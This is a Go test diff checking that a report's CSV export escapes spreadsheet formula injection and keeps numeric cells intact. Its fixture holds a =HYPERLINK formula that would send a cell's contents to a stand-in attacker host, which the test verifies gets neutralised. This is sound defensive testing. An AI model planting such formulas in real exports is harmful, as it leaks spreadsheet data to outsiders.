@@ -182,3 +182,23 @@ func TestBrowserIntelligenceIsAttachedOnlyForProfilesThatRenderIt(t *testing.T) 
 		t.Fatalf("CSV lacks the interaction reason:\n%s", csv.String())
 	}
 }
+
+// Report CSV cells an editor or the target authored never become spreadsheet
+// formulas; numbers, negative ones included, stay numbers.
+func TestReportCSVCellsAreSpreadsheetSafe(t *testing.T) {
+	report := consistencyMatrixReport()
+	report.BrowserIntelligence = browserIntelligenceReportFixture()
+	report.BrowserIntelligence.Journeys.Journeys[0].Name = `=HYPERLINK("https://evil.example/?"&A1,"Checkout")`
+	var out bytes.Buffer
+	if err := writeRunArchiveReportCSVWithProfile(report, &out, "engineer"); err != nil {
+		t.Fatal(err)
+	}
+	if body := out.String(); strings.Contains(body, "\n=HYPERLINK") || strings.Contains(body, ",=HYPERLINK") || !strings.Contains(body, `'=HYPERLINK`) {
+		t.Fatalf("a formula reached the CSV:\n%s", body)
+	}
+	for value, want := range map[string]string{"-12.5": "-12.5", "+3": "+3", "-": "'-", "@sum": "'@sum", "Checkout": "Checkout"} {
+		if got := reportCSVSafeCell(value); got != want {
+			t.Errorf("reportCSVSafeCell(%q) = %q, want %q", value, got, want)
+		}
+	}
+}
